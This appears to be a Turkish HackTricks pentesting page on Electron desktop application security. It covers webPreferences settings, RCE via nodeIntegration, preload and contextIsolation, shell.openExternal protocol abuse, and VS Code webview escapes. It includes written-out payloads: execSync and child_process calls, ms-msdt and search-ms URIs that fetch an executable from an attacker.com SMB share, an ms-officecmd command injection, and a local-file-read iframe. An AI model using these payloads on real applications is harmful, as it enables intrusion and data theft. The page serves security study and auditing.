# Electron Masaüstü Uygulamaları

{{#include ../../banners/hacktricks-training.md}}

## Giriş

Electron, ayrıcalıklı bir **Node.js** ana sürecini **Chromium** renderer süreçleriyle birleştirir. Electron bir web tarayıcısı değildir: uygulama kodu, dosya sistemi ve shell erişimi gibi yetenekleri kasıtlı olarak açığa çıkarabilir. Bu nedenle güvenilmeyen içerik yüklemek, sıradan bir web sitesindekinden daha sıkı bir sınır tasarımı gerektirir.<sup>[[21]](#references)</sup>

Electron uygulama kodu genellikle bir `.asar` arşivinde paketlenir. Kaynak kodu incelemeden önce arşivi çıkarın:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Uygulamanın `package.json` dosyası ana giriş noktasını belirtir. Bu dosya genellikle renderer pencereleri oluşturur ve güvenlikle ilgili `webPreferences` ayarlarını belirler.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron'ın iki temel süreç türü vardır:

- Main Process (NodeJS'e tam erişimi vardır)
- Renderer Process (güvenlik nedenleriyle NodeJS erişimi kısıtlanmalıdır)

![Electron Desktop Apps - Introduction: Renderer Process (güvenlik nedenleriyle NodeJS erişimi kısıtlanmalıdır)](<../../images/image (182).png>)

Bir **renderer process**, bir dosya yükleyen tarayıcı penceresidir:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**Ana süreç**, genellikle bir `BrowserWindow` oluştururken her renderer sürecini yapılandırır. Güvenli ayarlar, renderer'ın ele geçirilmesinin native code yürütmeye dönüşme olasılığını azaltır; ancak güvenilmeyen içeriği doğası gereği güvenli hâle getirmez.<sup>[[21]](#references)[[22]](#references)</sup>

En azından şu renderer tercihlerini inceleyin:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** varsayılan olarak `false` değerindedir. Etkinleştirilmesi, renderer JavaScript'ine Node.js API'lerine erişim sağlar ve aynı zamanda o renderer'ın sandbox'ını devre dışı bırakır.
- **`contextIsolation`** varsayılan olarak `true` değerindedir. Sayfanın JavaScript bağlamını, preload betikleri ve Electron dahili bileşenleri tarafından kullanılan bağlamdan ayırır.
- **`preload`** için varsayılan bir yol yoktur. Yapılandırılmış bir preload betiği, sayfa betiklerinden önce çalışır ve `contextBridge` üzerinden kapsamı daraltılmış API'ler sunabilir.
- **`sandbox`**, Electron 20'den bu yana varsayılan olarak `true` değerindedir. Renderer'ın işletim sistemi kaynaklarına erişimini kısıtlar; `nodeIntegration: true` olarak ayarlanması sandbox'ı devre dışı bırakır.
- **`nodeIntegrationInWorker`** varsayılan olarak `false` değerindedir ve Web Workers içindeki Node.js entegrasyonunu kontrol eder.
- **`nodeIntegrationInSubFrames`** varsayılan olarak `false` değerindedir.
  - **`nodeIntegration`** **etkinleştirilirse**, Electron uygulamasında **iframe'lere yüklenen** web sayfalarında **Node.js API'lerinin** kullanılmasına izin verir.
  - **`nodeIntegration`** **devre dışı bırakılırsa**, preload'lar iframe içinde yüklenir.

Yapılandırma örneği:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

[Buradaki bazı **RCE payloads**](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Trafiği yakalama

start-main yapılandırmasını değiştirin ve aşağıdaki gibi bir proxy kullanımı ekleyin:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REA ile statik ASAR'dan native sınıra iz sürme

**REA**, JavaScript bootstrap'ını çalıştırmadan bir ASAR'ı veya çıkarılmış uygulama dizinini okuyabilir. Uygulama grafiği; paket giriş noktalarını, bundle edilmiş modülleri, `BrowserWindow` ve preload ayarlarını, `contextBridge` üyelerini, IPC kayıtlarını, native eklenti isteklerini ve source map kimliklerini kaydeder. Böylece renderer'a açığa çıkarılmış bir yeteneğin ayrıcalıklı bir main-process handler'ına izini sürmek için başlangıç noktası sağlar.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Literal bir özellik dizgesi için, tam Evidence kaydını `application` olarak iletin ve seed değerini hedefte gözlemlenen bir değerle değiştirin:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Aynı `trace_application_feature` workflow, gözlemlenen bir literal API member, IPC channel veya module'ü seed olarak da kabul eder. Döndürülen source location'lara göre elde edilen handler path'ini, validation adaylarını ve native handoff'u kontrol edin. Bir renderer `invoke`, yalnızca aynı exact literal channel üzerinde bulunan tekil bir `ipcMain.handle`/`handleOnce` adayıyla eşleşir; `send` için de tekil bir `ipcMain.on`/`once`/`addListener` adayı gerekir. Dinamik veya yinelenen handler'lar çözümlenmemiş olarak kalır. İstenen bir `.node` member, doğrulanmış bir native export değildir; bu sonuca varmak için eşleşen Hopper/Ghidra Evidence aynı artifact digest'e sahip olmalıdır. Statik reachability, path'in çalıştırıldığını da kanıtlamaz.<sup>[[24]](#references)[[25]](#references)</sup>

Renderer-to-main trust boundary ve handler validation hakkında bilgi için [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) sayfasına bakın.

Provider-bound native follow-up için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) sayfasına bakın.

## Electron auto-update saldırı yüzeyi

Release-feed integrity, rollback, signed-channel confusion ve staging-file TOCTOU hakkında bilgi için [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) sayfasına bakın.

## Electron Local Code Injection

Yüklü bir uygulamada local write veya instrumentation erişiminiz varsa ASAR/main-process ve V8 snapshot path'leri ile OS-specific bağlantılar için [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) sayfasına bakın.

## RCE: XSS + nodeIntegration

**nodeIntegration** **on** olarak ayarlanırsa bir web sayfasının JavaScript'i, yalnızca `require()` çağrısı yaparak Node.js özelliklerini kolayca kullanabilir. Örneğin, Windows'ta calc uygulamasını çalıştırmanın yolu şöyledir:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Bu ayarda belirtilen betik, **renderer'daki diğer betiklerden önce yüklenir**, bu nedenle **Node API'lerine sınırsız erişime sahiptir**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Bu nedenle script, node-features'ı sayfalara aktarabilir:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **`contextIsolation` açıksa bu işe yaramaz**

## RCE: XSS + contextIsolation

_**contextIsolation**_, **web sayfası script'leri ile Electron'un dahili JavaScript kodu arasında ayrı bağlamlar** oluşturur; böylece her bir kodun JavaScript yürütmesi diğerini etkilemez. Bu, RCE olasılığını ortadan kaldırmak için gerekli bir özelliktir.

Bağlamlar yalıtılmamışsa saldırgan şunları yapabilir:

1. **Renderer'da rastgele JavaScript yürütmek** (XSS veya harici sitelere yönlendirme)
2. Preload veya Electron'un dahili kodunda kullanılan **yerleşik metodu kendi fonksiyonuyla değiştirmek**
3. **Değiştirilmiş fonksiyonun kullanılmasını tetiklemek**
4. RCE?

Yerleşik metotların değiştirilebileceği 2 yer vardır: Preload kodunda veya Electron'un dahili kodunda:

{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Tıklama olayını atlatma

Bir bağlantıya tıkladığınızda kısıtlamalar uygulanıyorsa normal sol tıklama yerine **orta tıklama yaparak** bunları atlatabilirsiniz

```javascript
window.addEventListener('click', (e) => {
```

## shell.openExternal üzerinden RCE

Bu örnekler hakkında daha fazla bilgi için [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ve [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Bir Electron masaüstü uygulaması dağıtırken, `nodeIntegration` ve `contextIsolation` için doğru ayarların yapılması çok önemlidir. Bu ayarlar etkinleştirildiğinde, ana süreçten preload script'lerini veya Electron'un yerel kodunu hedefleyen **istemci tarafı uzaktan kod yürütme (RCE)** saldırılarının etkili biçimde önlendiği bilinmektedir.

Kullanıcı bağlantılarla etkileşime girdiğinde veya yeni pencereler açtığında, uygulamanın güvenliği ve işlevselliği açısından kritik olan belirli event listener'lar tetiklenir:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Bu listener'lar, kendi **business logic**'ini uygulamak için **desktop application** tarafından override edilir. Uygulama, gezinilen bir linkin uygulama içinde mi yoksa harici bir web browser'da mı açılması gerektiğini değerlendirir. Bu karar genellikle `openInternally` adlı bir function aracılığıyla verilir. Bu function `false` döndürürse, linkin `shell.openExternal` function'ı kullanılarak harici olarak açılması gerektiği anlamına gelir.

**Basitleştirilmiş bir pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS security best practices, çeşitli protokoller üzerinden RCE'ye yol açabileceğinden, `openExternal` function'ına güvenilmeyen içerik verilmemesini önerir. İşletim sistemleri RCE'yi tetikleyebilecek farklı protokolleri destekler. Bu konuya ilişkin ayrıntılı örnekler ve açıklamalar için, bu güvenlik açığından yararlanabilen Windows protokolü örneklerini içeren [bu kaynağa](https://positive.security/blog/url-open-rce#windows-10-19042) başvurabilirsiniz.<sup>[[10]](#references)</sup>

macOS'te `openExternal` function'ı, `shell.openExternal('file:///System/Applications/Calculator.app')` örneğindeki gibi, keyfi komutları çalıştırmak için istismar edilebilir.

**Windows protokol exploit örnekleri:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Bu zafiyet **[bu raporda](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** bulunabilir.<sup>[[11]](#references)</sup>

**webviewTag**, **renderer process** içinde **NodeJS** kullanımına izin veren **kullanımdan kaldırılmış bir özelliktir**. **preload context** içinde bir script yüklemeye izin verdiği için devre dışı bırakılmalıdır:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Bu nedenle, rastgele bir sayfa yüklemeyi başaran bir saldırgan, bu tag'i **rastgele bir preload script yüklemek** için kullanabilirdi.

Bu preload script daha sonra **RCE elde etmek için `shell.openExternal` çağıran savunmasız bir IPC servisini (`skype-new-window`)** çağırmak üzere kötüye kullanıldı.

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Dahili Dosyaları Okuma: XSS + contextIsolation

**`contextIsolation` özelliğini devre dışı bırakmak, `<iframe>` benzeri `<webview>` etiketlerinin kullanılmasını sağlar**; böylece yerel dosyalar okunup exfiltrate edilebilir. Verilen bir örnek, dahili dosyaların içeriğini okumak için bu güvenlik açığından nasıl yararlanılabileceğini gösterir:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Dahili Dosyaları Okuma: XSS + contextIsolation: contextIsolation özelliğini devre dışı bırakmak, ... benzeri ... etiketlerinin kullanılmasını sağlar...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Ayrıca, bir Electron masaüstü uygulamasındaki kritik bir yerel dosya okuma güvenlik açığını vurgulayan **dahili bir dosyayı okumanın** başka bir yöntemi de paylaşılır. Bu yöntemde, uygulamadan yararlanmak ve verileri exfiltrate etmek için bir script enjekte edilir:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Eski Chromium**

Uygulamayla birlikte gelen **Chromium** sürümü eskiyse ve bilinen güvenlik açıklarına sahipse, bu açıklardan yararlanıp XSS'i RCE'ye dönüştürmek mümkün olabilir.<sup>[[20]](#references)</sup>\
Bu **writeup**'ta bir örnek görebilirsiniz: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Dahili URL regex atlatması üzerinden XSS phishing**

XSS bulduysanız ancak **RCE tetikleyemiyor veya dahili dosyaları çalamıyorsanız**, yine de **phishing yoluyla kimlik bilgilerini çalmayı** deneyebilirsiniz.<sup>[[1]](#references)</sup>

Öncelikle, yeni bir URL açıldığında ne olduğunu belirlemek için frontend kodunu inceleyin:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** çağrısı, bir platform bağlantısının **masaüstü penceresinde** mi yoksa üçüncü taraf bir kaynağın sistem tarayıcısında mı açılacağını belirler.

Fonksiyonun URL allowlist regex'i atlatılabilirse (örneğin, hostname'deki noktalar escape edilmediği için), bir saldırgan XSS'i kötüye kullanarak saldırganın kontrolündeki bir altyapıda inandırıcı bir kimlik bilgisi istemi açabilir:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protokolü

[Electron güvenlik kılavuzunda](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) belirtildiği gibi, **`file://`** üzerinde çalışan sayfalar geniş dosya erişimine sahiptir. Bu nedenle **XSS, kullanıcının makinesindeki rastgele dosyaları yüklemek için kullanılabilir**. Doğru tasarlanmış bir **özel protokol**, erişimi belirli bir dosya kümesiyle kısıtlayabilir.<sup>[[21]](#references)</sup>

Masaüstü asistanı önizlemelerinde farklı bir worker-context dosya kapsamı bypass'ı için bkz. [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote modülü

Electron Remote modülü, **renderer süreçlerinin main process API'lerine erişmesini** sağlayarak bir Electron uygulaması içindeki iletişimi kolaylaştırır. Ancak bu modülün etkinleştirilmesi önemli güvenlik riskleri doğurur. Uygulamanın saldırı yüzeyini genişleterek, onu siteler arası betik (XSS) saldırıları gibi güvenlik açıklarına karşı daha savunmasız hâle getirir.

> [!TIP]
> **remote** modülü main process'teki bazı API'leri renderer süreçlerine sunsa da, yalnızca bu bileşenleri kötüye kullanarak RCE elde etmek kolay değildir. Ancak bileşenler hassas bilgileri açığa çıkarabilir.

> [!WARNING]
> Hâlâ remote modülünü kullanan birçok uygulama, bunu renderer sürecinde **NodeIntegration'ın etkin olmasını gerektirecek şekilde** kullanır. Bu, **çok büyük bir güvenlik riskidir**.

Electron'ın yerleşik `remote` modülü kullanımdan kaldırıldı ve ardından kaldırıldı; bu modeli kullanmaya devam etmesi gereken uygulamalar ayrı `@electron/remote` paketini kullanabilir. Güvenlik ve performans etkileri nedeniyle, remote benzeri yetenekleri güvenilmeyen renderer'lara açmaktan kaçının.

`@electron/remote` kullanırken, önce **main process'te başlatılması** gerekir:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Renderer süreci daha sonra modülden nesneleri içe aktarabilir:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

The **[blog yazısı](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**, remote module'deki **`app`** nesnesi tarafından sunulan bazı ilginç **fonksiyonları** gösteriyor:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - Mevcut örneği **sonlandırıp** yeni bir örnek **başlatarak** uygulamayı **yeniden başlatır**. **Uygulama güncellemeleri** veya önemli **durum değişiklikleri** için kullanışlıdır.
- **`app.setAppLogsPath([path])`**  
   - **Uygulama günlüklerini** depolamak için bir dizin **tanımlar** veya **oluşturur**. Günlükler, **`app.getPath()`** veya **`app.setPath(pathName, newPath)`** kullanılarak **alınabilir** ya da **değiştirilebilir**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - Geçerli çalıştırılabilir dosyayı, belirtilen bir **protokol** için **varsayılan işleyici** olarak **kaydeder**. Gerekirse **özel bir yol** ve **argümanlar** sağlayabilirsiniz.
- **`app.setUserTasks(tasks)`**  
   - **Jump List** içindeki **Tasks kategorisine** (Windows'ta) görevler **ekler**. Her görev, uygulamanın nasıl **başlatılacağını** veya hangi **argümanların** iletileceğini belirleyebilir.
- **`app.importCertificate(options, callback)`**  
   - Bir **PKCS#12 sertifikasını** sistemin **sertifika deposuna** **aktarır** (yalnızca Linux). Sonucu işlemek için bir **callback** kullanılabilir.
- **`app.moveToApplicationsFolder([options])`**  
   - Uygulamayı **Applications klasörüne** taşır (macOS'ta). Mac kullanıcıları için **standart bir kurulum** sağlamaya yardımcı olur.
- **`app.setJumpList(categories)`**  
   - **Windows**'ta özel bir **Jump List'i** **ayarlar** veya **kaldırır**. Görevlerin kullanıcıya nasıl gösterileceğini düzenlemek için **kategoriler** belirtebilirsiniz.
- **`app.setLoginItemSettings(settings)`**  
   - **Oturum açıldığında** hangi **çalıştırılabilir dosyaların** ve bunların hangi **seçeneklerle** başlatılacağını yapılandırır (yalnızca macOS ve Windows).
  
Örnek:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences modülü

Electron'da sistem tercihlerine erişmek ve **sistem olayları yaymak** için kullanılan **birincil API**'dir. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** ve **setUserDefault** gibi yöntemlerin tümü bu modülün **parçasıdır**.

**Örnek kullanım:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **NSDistributedNotificationCenter kullanarak** **native macOS notifications** dinler.  
* **macOS Catalina** öncesinde, CFNotificationCenterAddObserver'a **nil** geçirerek **tüm** dağıtılmış bildirimleri dinleyebilirdiniz.  
* **Catalina / Big Sur** sonrasında, sandbox'lı uygulamalar bildirimleri **ada göre** kaydederek **birçok olaya** (örneğin **ekran kilitlenmesi/açılması**, **birimlerin bağlanması**, **ağ etkinliği** vb.) **abone olmaya** devam edebilir.

### **getUserDefault / setUserDefault**

* macOS'te **uygulama** veya **genel** tercihleri depolayan **NSUserDefaults** ile **arayüz sağlar**.
    
* **getUserDefault**, **son kullanılan dosya konumları** veya **kullanıcının coğrafi konumu** gibi hassas bilgileri **alabilir**.
    
* **setUserDefault**, bu tercihleri **değiştirerek** bir uygulamanın **yapılandırmasını** etkileyebilir.
    
* **Eski Electron sürümlerinde** (v8.3.0 öncesi), yalnızca NSUserDefaults'ın **standart paketi** **erişilebilirdi**.

## Shell.showItemInFolder

Bu işlev, belirtilen dosyayı bir dosya yöneticisinde gösterir. Etkilenen platform ve sürümlerde bu etkileşim **dosyayı otomatik olarak çalıştırabilirdi**.

Daha fazla bilgi için bkz.: [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron uygulamalarında **XSS saldırılarını önlemek** için **Content Security Policy (CSP)** bulunmalıdır. **CSP**, tarayıcıda **güvenilmeyen kodların çalıştırılmasını önlemeye** yardımcı olan bir **güvenlik standardıdır**.

Genellikle **`main.js`** dosyasında veya CSP'nin bir **meta tag** içinde yer aldığı **`index.html`** şablonunda **yapılandırılır**.

Daha fazla bilgi için bkz.:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Bu gerçek dünya saldırı zinciri Visual Studio Code 1.63'ü (CVE-2021-43908) etkiledi ve CSP, postMessage ve scheme handler'lar yanlış yapılandırıldığında webview içindeki tek bir markdown kaynaklı XSS'in tam RCE'ye nasıl yükseltilebileceğini gösteriyor. Herkese açık PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Saldırı zincirine genel bakış
- Webview CSP üzerinden ilk XSS: Oluşturulan CSP, `style-src 'self' 'unsafe-inline'` içeriyordu ve `vscode-webview://` bağlamında inline/style tabanlı injection'a izin veriyordu. Payload, hedef webview'in extensionId bilgisini dışarı sızdırmak için `/stealID` adresine beacon gönderiyordu.
- Hedef webview URL'sini oluşturma: Sızdırılan ID kullanılarak `vscode-webview://<extensionId>/.../<publicUrl>` oluşturuluyordu.
- postMessage trust üzerinden ikinci XSS: Dış webview, sıkı origin/type denetimleri olmaksızın `window.postMessage`'a güveniyor ve `allowScripts: true` ile saldırgan HTML'si yüklüyordu.
- Scheme/path rewriting üzerinden yerel dosya yükleme: Payload, `file:///...` adresini `vscode-file://vscode-app/...` olarak yeniden yazıyor ve zayıf path validation'dan yararlanarak ayrıcalıklı bir yerel kaynağı yüklemek için `exploit.md` dosyasını `RCE.html` ile değiştiriyordu.
- Node etkin bağlamda RCE: Yüklenen HTML, Node API'leri kullanılabilir durumdayken çalıştırılıyor ve işletim sistemi komutlarının yürütülmesini sağlıyordu.

Son bağlamdaki örnek RCE primitive'i
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

PostMessage güven sorunları hakkında ilgili okuma:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: sentetik webview kısayolları + bildirimsel extension komut köprüleri

Haziran 2026'da farklı bir VS Code webview escape sınıfı ortaya çıktı: **notebook/preview webview içindeki güvenilmeyen JavaScript, ayrıcalıklı global kısayolları sentetik olarak tetikleyebiliyordu**; çünkü webview preload, `keydown` verilerini host workbench'e iletiyor ve host bunları gerçek kullanıcı girdisi olarak işliyordu.<sup>[[14]](#references)</sup>

Bu, proje denetimindeki içeriğin ayrıcalıklı editor özelliklerine ulaştığı IDE trust-boundary saldırılarının daha geniş tarihçesinin bir parçasıdır.<sup>[[19]](#references)</sup>

### Sınır ihlali

Cross-origin/sandbox'lı bir webview, saldırgan denetimindeki klavye alanlarını (`key`, `code`, `keyCode`, modifiers, `repeat`) **`event.isTrusted` kontrolü yapmadan** ayrıcalıklı bir `postMessage`/message-port köprüsüne kopyalarsa, webview içindeki JavaScript şu yollarla workbench kısayollarını çalıştırabilir:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Bu, özellikle **tarayıcı sentetik yazmayı engellediğinde** kullanışlıdır. Betiklenmiş tuş olayları genellikle HTML `<input>` öğelerine **istenen metni yazamaz**, ancak yine de doğrudan `keydown` olaylarını işleyen kısayolları tetikleyebilir.

### Pratik kötüye kullanım kalıpları

- **Kısayol odaklı arayüz kötüye kullanımı:** Komut yazmaya çalışmak yerine bildirimleri kabul etme, palet içinde gezinme, odaktaki düğmeyi etkinleştirme veya menülerde gezinme gibi genel kısayol bağlamalarını hedefleyin.
- **Çalışma alanı meta verilerinden kaynaklanan öngörülebilir ayrıcalıklı istemler:** Depo tarafından kontrol edilen bir `.vscode/extensions.json`, saldırganın eklentisini önerebilir ve `Ctrl+Shift+A` gibi bir kısayolla kabul edilebilecek öngörülebilir bir yükleme bildirimi oluşturabilir.
- **Komut köprüsü olarak bildirimsel eklenti manifesti:** Web VS Code'da yerel çalışma alanı eklenti kodu CSP tarafından engellense bile bildirimsel `package.json` katkıları yüklenebilir. `.vscode/extensions` altındaki yerel bir eklenti, `runCommands` ve ardından `workbench.extensions.installExtension` gibi ayrıcalıklı bir dahili komutu çağıran bir tuş bağlaması kaydedebilir.<sup>[[14]](#references)[[18]](#references)</sup>

Örnek manifest kalıbı:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Güvenilmeyen metadata üzerinden erişilebilen gizli güvenlik bayrakları:** Dahili komut `{"context":{"skipPublisherTrust":true}}` gibi saldırgan denetimindeki argümanları kabul ediyorsa, bildirimsel metadata bir güven penceresini atlayıp Marketplace/CDN üzerinden barındırılan ve sonunda saldırgan kodu çalıştıran bir extension yükleyebilir.
- **Güvenilen çalışma alanlarının kötüye kullanılması:** Uzak/web çalışma alanları otomatik olarak güvenilir kabul ediliyorsa, yerel çalışma alanı extension'ları repository içeriğinden ayrıcalıklı editor eylemlerine uzanan değerli bir köprüye dönüşür.
- **Ele geçirilme sonrası kapsamın genişletilmesi:** Extension çalıştırıldıktan sonra editor'ün extension'lara hangi token'ları sunduğunu inceleyin. `github.dev` ortamında çalınan GitHub token'ı, açık repository'nin ötesinde geçerliydi; bu nedenle `https://api.github.com/user/repos` adresine yapılan sorgu, erişilebilir başka private repository'leri de listeledi.

### Denetim notları

- **Webview'dan host'a girdi yönlendirmeyi** bir ayrıcalık sınırı olarak değerlendirin; güvenilmeyen frame'lerden gelen sentetik key/click event'lerini host'a asla yeniden yönlendirmeyin.
- Yetkilendirmeyi hassas komutların **içinde** uygulayın. `skipPublisherTrust` gibi dahili bayrakları ayarlayabilen, çağıran tarafından sağlanan komut context'ini kabul etmeyin.
- Yerel executable extension kodunun çalışmasını engellemenin yeterli olduğunu varsaymayın; çalışma alanı denetimindeki manifest'lerdeki **bildirimsel katkıları** (`keybindings`, `menus`, `commands`, tasks) da inceleyin.
- 3 Haziran 2026 düzeltmeleri, yönlendirilen event'lere `isTrusted` ekledi, notebook webview'larında güvenilmeyen key yönlendirmesini devre dışı bıraktı ve çağıran tarafından sağlanan install-command context'inin kabul edilmesini durdurdu.<sup>[[16]](#references)[[17]](#references)</sup>

## **Araçlar**

Seçkili **awesome-electronjs-hacking** koleksiyonu, ek araştırma, araçlar ve savunmasız uygulama kaynakları sunar.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity), Electron tabanlı uygulamalardaki yanlış yapılandırmaları ve güvenlik anti-pattern'lerini belirleyen bir araçtır.
